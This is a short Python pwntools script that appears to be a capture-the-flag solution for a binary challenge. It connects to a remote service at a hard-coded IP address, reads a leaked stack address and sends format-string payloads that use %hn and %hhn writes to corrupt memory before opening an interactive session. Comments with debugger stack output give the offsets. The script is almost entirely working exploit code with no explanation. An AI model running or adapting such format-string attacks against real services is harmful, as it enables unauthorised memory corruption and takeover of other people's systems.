from pwn import *
elf = context.binary = ELF("./chall")
r = elf.process()
r = remote("103.130.219.236", 5001)
# gdb.attach(r, '''
#     b*main+332\n
#     c
# ''')
r.recvuntil(b"My stack:")
input_addr = int(r.recvline(),16)
log.success(f"Input address: {hex(input_addr)}")
input_addr = input_addr + 15
'''
02:0010│ rdi 0x7fffffffe000 ◂— 0x6324303125 /* '%10$c' */ <--- offset 8
...
11:0088│     0x7fffffffe078 —▸ 0x7fffffffe168 —▸ 0x7fffffffe3ff ◂— '/mnt  <--- offset 23
...
2f:0178│ rbx 0x7fffffffe168 —▸ 0x7fffffffe3ff ◂— '/mnt/c/Users/p  <--- offset 53
'''
payload = f"%{input_addr&0xffff}c%23$hn".encode()
r.send(payload)

payload = f"cc%{0x63}c%53$hhnc".encode()
r.send(payload)

payload = b"c"*16
r.send(payload)
r.interactive()